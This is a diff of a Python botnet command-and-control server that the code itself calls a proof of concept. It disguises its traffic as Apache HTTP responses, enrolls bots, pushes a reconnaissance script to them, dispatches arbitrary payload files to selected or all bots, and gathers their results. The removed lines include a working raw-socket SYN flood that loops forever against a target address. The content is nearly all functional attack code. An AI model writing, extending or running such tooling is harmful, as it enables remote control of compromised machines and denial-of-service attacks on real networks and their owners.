@@ -1,268 +1,324 @@
-#botnet server POC
-#uses web requests to direct botnet
-
-#not sure how low level libraries we need to use
-
-from multiprocessing import Process, Queue, Manager, Pool
-import SocketServer
-import ssl
-from socket import * #want lower level than built-in tcp servers
-from struct import * #want for packing packets
-import sys
+from multiprocessing import Process, Queue, Pool, Manager, active_children
+import threading
+from threading import Lock
+import socket
 import logging
-import math
-import timeit
-import array
+import sys, signal, os
+import cPickle
+import random, string
+import base64
+import time
+import datetime
+import Queue
 
-PORT = ('localhost', 4443)
+PORT = ('localhost', 80)
+commandQueue = Queue.Queue() #Holds commands from GUI to be processed by commandHandler thread
+processQueue = Queue.Queue() #Holds queue of processes to be terminated on shutdown
 
-NUMBEROFTHREADS = 4 #will probably create new threads on demand rather than use poollike
-NUMBEROFWORKERS = NUMBEROFTHREADS - 1
+class Bot:
+    ID = ''
+    fqn = ''
+    machine = ''
+    OS = ''
+    info = ''
+    IP = ''
+    port = 0
+    time = ''
+    def dump(self):
+        logging.info( "Bot: " + self.ID + ";" + self.fqn + ";" + self.machine + ";" + self.OS + ";" + self.info + ";" + self.IP + ";" + str(self.port) + ';' + self.time)
 
-def Sieve(n):
-	#default sieve of eratosthenes
-	A = [True for _ in xrange(0,n+1)]
-	B = []
-	outerlimit = n ** .5
-	i = 2
-	while i <= outerlimit:
-		if A[i]:
-			B.append(i)
-			p = i ** 2
-			while p <= n:
-				A[p] = False
-				p += i
-		i += 1
-	
-	while i <= n:
-		if A[i] == True:
-			B.append(i)
-		i += 1
-	#print B
+#unfortunately manager.list does not handle custom classes very well so we manually convert targets and results to strings
+class Payload:
+    ID = ''
+    command = ''
+    name = ''
+    targets = "" #list of bots
+    results = "" #list of botId and results
+    def addTarget(self, botId):
+        temp = []
+        if(self.targets == ""):
+            temp.append(botId)
+        else:
+            temp = cPickle.loads(self.targets);
+            temp.append(botId)
+        self.targets = cPickle.dumps(temp)
+    def addResult(self, botId, r):
+        temp = {}
+        if(self.results == ""):
+            temp[botId] = r
+        else:
+            temp = cPickle.loads(self.results);
+            temp[botId] = r
+        self.results = cPickle.dumps(temp)
+    def getTargets(self):
+        temp = []
+        if(self.targets != ""):
+            temp = cPickle.loads(self.targets);
+        return temp
+    def getResults(self):
+        temp = {}
+        if(self.results != ""):
+            temp = cPickle.loads(self.results);
+        return temp
 
-	return B
-
-def DistSieveTarget((n, tlow, thigh), B=None):
-	#sieve for use in threads of DistributedSieve
-	#n = number to sieve
-	#B = list of primes used to sieve
-	#A = partition we want to sieve
-	#tindex = first number A represents
-
-	list1 = [True for _ in xrange(0, n+1)]#list of all numbers to sieve
-	list2 = [True for _ in xrange(0, thigh-tlow+1)]#list of numbers in this partition
-
-	outerlimit = math.sqrt(n)
-	i = 2
-	
-	while i <= outerlimit:
-		if list1[i]:
-			p = i ** 2
-			while p <= n:
-				list1[p] = False
-				p += i
-				
-			q = i ** 2
-			while q <= thigh:
-				if q < tlow:
-					q += i
-					continue
-				try:
-					list2[q-tlow] = False
-				except:
-					print tlow, thigh
-					print q-tlow
-					print list2
-					print thigh-tlow+1
-					raise IndexError
-				q += i
-		i += 1
-
-	C = [val+tlow for val, j in enumerate(list2) if j]
-
-	#print C
-	return C
-	
-def DistributedSieve(n, threadn):
-	#simple threading, sieve of n**1/2 first finds those primes then send to each thread with a partition
-
-	temp = math.floor((n-1)) / (math.floor(math.sqrt(n)))
-
-	#we want n to be divisible by threadn so we can make equal partitions
-	newn = n + (threadn - n) % threadn
-
-	A = [True for _ in xrange(2,n+1)]
-	
-	partitionint = int(newn/threadn)
-	
-	distA = tuple([n, partitionint*i, i*partitionint+partitionint - 1] for i in xrange(threadn))
-
-	pool = Pool(threadn)
-	
-	B = reduce(lambda a,b: a+b, pool.map(DistSieveTarget, distA))
-	B = [b for b in B if b >=2 and b <= n]
-
-	return B
-
-def worker(i, commandqueue, finishedqueue):
-    logging.info("Starting worker process")
-    
-    while True:
-        #accept connection
-        #print (commandqueue)
-        if "q" in commandqueue or "quit" in commandqueue:
-            print (commandqueue)
-            return
-
-def server(processlist):
-    logging.info("Starting server process")
-    #one called every time program starts
-    sock = socket(AF_INET, SOCK_STREAM)
+#listens for connections from bots
+def server(finishedPayloads, payloadProxy, BOTS):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind(PORT)
     sock.listen(1)
-    
+    curr_payloads = []
+    c = 0
     while True:
+        logging.debug("Server while loop")
+        logging.debug("Payload Queue size: " + str(len(payloadProxy[0])))
         conn, address = sock.accept()
-        logging.debug("Got connection")
-        #Process(target=worker, args =???)
-        process.daemon = True
-        process.start()
+        threading.Thread(target = communicate, args=(conn, address, payloadProxy, BOTS, finishedPayloads)).start()
+        for key, value in BOTS.items():
+            value.dump()
+    sock.close()
+
+def parse_get(request):
+    #return (id, action, script, result)
+    tokens = request.split(' ')
+    path = tokens[1]
+    if path == "/":
+        return ('', '', '', '')
+    try:
+        pathTokens = path.split('/')
+        botId = pathTokens[1]
+        action = ''
+        if len(pathTokens) > 3:
+            action = pathTokens[2]
+        result = ''
+        if '_res=' in request:
+            result = request.split('_res=', 1)[1].split(' ', 1)[0]
+        script = ''
+        if '_src=' in request:
+            script = request.split('_src=', 1)[1].split(' ', 1)[0]
+        return (botId, action, script, result)
+    except:
+        return ('', '', '', '')
+
+def getID():
+    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(8))
+
+def genCommandFromPayload(payload):
+    command = payload.command
+    full_command = str(len(command)) + ';' + payload.ID + ";" + command
+    return full_command
+
+def createFalseHeader(length, data):
+    s = '1.1 200 OK\nDate: ' + datetime.datetime.fromtimestamp(int(time.time())).strftime('%a, %d %b %Y %H:%M:%S') + '\nServer: Apache\n' + 'Content-Length: ' + str(length) + '\nConnection: close\nContent-Type:text/html\n' + data
+    return s
+
+def checkIfIsTarget(botId, payloads):
+    logging.debug("Checking if is target")
+    for p in payloads:
+        logging.debug("Checking payload: " + p.ID)
+        logging.debug("Targets: " + str(len(p.targets)))
+        if botId in p.getTargets() and botId not in p.results:
+            logging.debug("Is in " + p.ID)
+            return p
+    return ''
+
+def communicate(conn, address, payloadProxy, BOTS, finished):
+    logging.debug("Accepted connection.")
+    payloads = payloadProxy[0]
+    size = 1024
+    try:
+        get_request_data = conn.recv(size)
+        logging.debug(get_request_data)
+        if get_request_data:
+            (botId, action, script, result) = parse_get(get_request_data)
+            if botId == '':
+                #new bot
+                logging.debug("Creating new bot")
+                newBotId = getID()
+                f = open('getInfo.py', 'r')
+                command = f.read()
+                f.close()
+                full_command = newBotId + ";" + str(len(command)) + ";" + 'getInfo.py'  + ";" + command
+                response = createFalseHeader(len(full_command), full_command)
+                logging.debug("Sending: " + response)
+                conn.send(response)
+                b = Bot()
+                b.ID = newBotId
+                BOTS[newBotId] = b
+            else:
+                if botId not in BOTS:
+                    raise Exception("Invalid bot id")
+                bot = BOTS[botId]
+                if action == 'r':
+                    #this is a reply to a script
+                    if script == 'getInfo.py':
+                        decoded = cPickle.loads(base64.b64decode(result))
+                        bot.fqn = decoded[0]
+                        bot.machine = decoded[2]
+                        bot.OS = decoded[1]
+                        bot.IP = decoded[3]
+                        bot.time = decoded[4]
+                        BOTS[bot.ID] = bot
+                    else:
+                        decoded = cPickle.loads(base64.b64decode(result))
+                        found = False
+                        rPayload = None
+                        for p in payloads[:]:
+                            if p.ID == script:
+                                p.addResult(botId, decoded)
+                                if len(p.getTargets()) == len(p.getResults()):
+                                    finished.append(p)
+                                    try:
+                                        payloads.remove(p)
+                                    except Exception, e:
+                                        logging.info(str(e))
+                                        logging.info("Failed to remove payload")
+                                found = True
+                                break
+                        if not found:
+                            #not expeccted
+                            logging.info("Received unexpected results from " + botId)
+                else:
+                    #here we need to check for a payload or return Nada
+                    p = ''
+                    if len(payloads) > 0:
+                        p = checkIfIsTarget(botId, payloads)
+                    if p != '':
+                        logging.debug("Payload selected: " + p.ID)
+                        full_command = genCommandFromPayload(p)
+                        response = createFalseHeader(len(full_command), full_command)
+                        logging.debug("Sending Response: " + response)
+                        conn.send(response)
+                    else:
+                        full_command = 'Nada'
+                        response = createFalseHeader(len(full_command), full_command)
+                        conn.send(response)
+        else:
+            logging.debug("No Data")
+            raise Exception('Connection disconnected')
+    except Exception, e:
+        logging.debug("Unexpected Error: " + str(e))
+        conn.close()
+        payloadProxy[0] = payloads
+        return False
+    payloadProxy[0] = payloads
+    conn.close()
+def shutdownGracefully():
+    children = active_children()
+    commandQueue.put('TERMINATE')
+    for child in children:
+        child.terminate()
+        child.join()
+    while not processQueue.empty():
+        p = processQueue.get()
+        p.terminate()
+        p.join()
+    sys.exit(0)    
+def signal_handler(signal, frame):
+    shutdownGracefully()
+class ExternalCommand:
+    command = ''
+    payloadID = ''
+def executeCommand(command, payloadProxy, finished, BOTS):
+    """
+    Available Commands
+    l = load payload
+      Usage: l <payload_file_name> <selectedbots>
+      Example: l getInfo.py bot1ID:bot2ID:bot3ID
+      or: l getInfo.py all
+    r = get results
+      Usage: r <PayloadID>
+    """
+    payloadList = payloadProxy[0]
+    payloadID = command.payloadID
+    cmd = command.command
+    tokens = cmd.split(' ', 1)
+    com = tokens[0]
+    args = tokens[1]
     
-def checksum(msg):
-	s = sum([(ord(msg[i*2]) << 8) + ord(msg[i*2+1]) for i in range(len(msg)/2)])
+    if com == 'l':
+        args = args.split(' ')
+        fname = args[0]
+        p = Payload()
+        p.name = fname
+        f = open(fname, 'r')
+        p.command = f.read()
+        f.close()
+        p.ID = payloadID
+        if args[1].lower() == 'all':
+            for key, value in BOTS.items():
+                p.addTarget(key)
+        else:
+            bots = args[1].split(':')
+            for key, value in BOTS.items():
+                if key in bots:
+                    p.addTarget(key)
+        logging.debug("Adding payload: " + p.ID)
+        payloadList.append(p)
+    if com == 'r':
+        #send to gui
+        sendToGUI([p.getResults() for p in finished if p.ID == args])
+    payloadProxy[0] = payloadList
+    
+def commandHandler(payloadList, finishedList, BOTS):
+    global commandQueue
+    while True:
+        cmd = commandQueue.get()
+        try:
+            if cmd == 'TERMINATE': break
+        except:
+            logging.info("Executing Command")
+        try:
+            executeCommand(cmd, payloadList, finishedList, BOTS)
+        except Exception, e:
+            logging.info("Failed Executing Command: " + str(e))
+message_lock = Lock()
 
-	s = (s>>16) + (s & 0xffff)
-
-	#complement and mask to 4 byte short
-	s = ~s & 0xffff
-
-	#print [(c, ord(c)) for c in msg]
-	return s
-
-def achecksum(pkt):
-	if len(pkt) % 2 == 1:
-		pkt += "\0"
-	s = sum(array.array("H", pkt))
-	s = (s >> 16) + (s & 0xffff)
-	s += s >> 16
-	s = ~s
-	return (((s>>8)&0xff)|s<<8) & 0xffff
-
-def DDoS(dip, dport):
-	HTTPS = False
-	port = 1337
-	dstip = dip
-	
-	srcip = "10.0.0.23"
-	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
-	s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-	
-	#we manually craft a packet
-	#scapy would be nice, but can't guarantee it's on every computer
-	#ip header fields
-	#used http://www.binarytides.com/raw-socket-programming-in-python-linux/
-	#for help creating packet
-	ipver = 4
-	ipihl = 5
-	iptos = 0
-	iptotlen = 40
-	ipid = 1
-	ipfragoff = 0
-	ipttl = 64
-	ipproto = IPPROTO_TCP
-	ipcheck = 0
-	ipsaddr = inet_aton(srcip)
-	ipdaddr = inet_aton(dstip)
-	
-	ipihlver = (ipver << 4) + ipihl
-	ipheader = pack('!BBHHHBBH4s4s', ipihlver, iptos, iptotlen, ipid, ipfragoff, ipttl, ipproto, ipcheck, ipsaddr, ipdaddr)
-
-	#tcp stuff
-	tcpsrc = 1337
-	tcpdst = port
-	tcpseq = 0
-	tcpackseq = 0
-	tcpdoff = 5
-	tcpfin = 0
-	tcpsyn = 1
-	tcprst = 0
-	tcppsh = 0
-	tcpack = 0
-	tcpurg = 0
-	tcpwin = 8192
-	tcpchk = 0
-	tcpupr = 0
-	
-	tcpoffsetres = (tcpdoff << 4) + 0
-	tcpflags = tcpfin + (tcpsyn << 1) + (tcprst << 2) + (tcppsh << 3) + (tcpack << 4) + (tcpurg << 5)
-	
-	tcpheader = pack('!HHLLBBHHH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin, tcpchk, tcpupr)
-
-	data = ''
-	placeholder = 0
-	tcplen = htons(len(tcpheader)+len(data))
-	
-	psh = pack('4s4sBBH', ipsaddr, ipdaddr, placeholder, ipproto, tcplen)
-	psh += tcpheader + data
-	
-	tcpchk = htons(checksum(psh))
-	#print tcpchk
-	ex= str("".join([c[0] for c in ('\n', 10), ('\x84', 132), ('\xaa', 170), ('\x1f', 31), ('\n', 10), ('\x00', 0), ('\x00', 0), ('\x17', 23), ('\x00', 0), ('\x06', 6), ('\x00', 0), ('\x14', 20), ('\x05', 5), ('9', 57), ('\x05', 5), ('9', 57), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('P', 80), ('\x02', 2), (' ', 32), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0)]))
-	#print checksum(ex)
-	#for a,b in zip(psh, ex):
-	#	print ord(a), ord(b)
-	tcpheader = pack('!HHLLBBH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin) + pack('H', tcpchk) + pack('!H', tcpupr)
-	
-	packet = ipheader + tcpheader + data
-	
-	while True:
-		s.sendto(packet, (dip, 0))
+def sendToGUI(message):
+    message_lock.acquire()
+    try:
+        print message
+    finally:
+        message_lock.release()
 
 def main():
-	#DDoS syn flood
-	DDoS("10.0.0.23", 1337)
-	
-def main3():#factoring algo
-	primes = 1001
-	#default sieve
-	print timeit.timeit('Sieve(10000001)', setup="from __main__ import Sieve", number=5)
-	
-	#sieve using n "threads" (convert to bots later)
-	print timeit.timeit('DistributedSieve(10000001, 2)', setup="from __main__ import DistributedSieve", number=5)
-	
-def main2():
-    logging.info("Starting main")
-    #create worker threads and send them to workerfunction
+    logging.info("Starting main.")
     manager = Manager()
-
-    #create managed lists passed on to worker threads
-    commandqueue = manager.list()
-    finishedqueuelist = [manager.list() for _ in xrange(NUMBEROFWORKERS)]   
-    processlist = manager.list()
-
-    #starting server process
-    serverproc = Process(target=server, args=(processlist, commandqueue))
+    finishedPayloadList = manager.list()
+    payloadProxy = manager.list()
+    payloadProxy.append([]);
+    BOTS = manager.dict()
+    serverproc = Process(target=server, args=(finishedPayloadList, payloadProxy, BOTS))
     serverproc.daemon = True
     serverproc.start()
-    logging.debug("Starting process %r", process)
-    
-    #main thread listens for what to do, then sends it off to server who sends it off to worker threads
+    processQueue.put(serverproc)
+    #grabs values from command queue and interprets it
+    cmd_thread = threading.Thread(target = commandHandler, args=(payloadProxy, finishedPayloadList, BOTS))
+    cmd_thread.start()
     while True:
         try:
-            cmd = input('Please input next command ("help" for help.): ')
-        except:
+            cmd = raw_input('Please input next command (\'help\' for help): ')
+        except Exception, e:
+            logging.info("Invalid input: " + str(e))
             break
-
-        #execute command - variable or signal?
-        commandqueue.append(cmd)
-
         if cmd == 'q' or cmd == "quit":
             break
-            
-    for p in splist:
-        p.join()        
-    
+        try:
+            newCommand = ExternalCommand()
+            newCommand.command = cmd
+            if cmd.split(' ')[0] == 'l':
+                newCommand.payloadID = getID()
+                sendToGUI( newCommand.payloadID + ' ' + cmd.split(' ')[1])
+            else:
+                newCommand.payloadID = cmd.split(' ')[1]
+                sendToGUI( newCommand.payloadID)
+
+            global commandQueue
+            commandQueue.put(newCommand)
+        except:
+            continue
+    shutdownGracefully()
 if __name__ == "__main__":
-    #logging.basicConfig(level=logging.DEBUG)
+    signal.signal(signal.SIGINT, signal_handler)
+    logging.basicConfig(filename='serverLog.log',level=logging.DEBUG)
     main()
-    #logging.info("Shutting down")
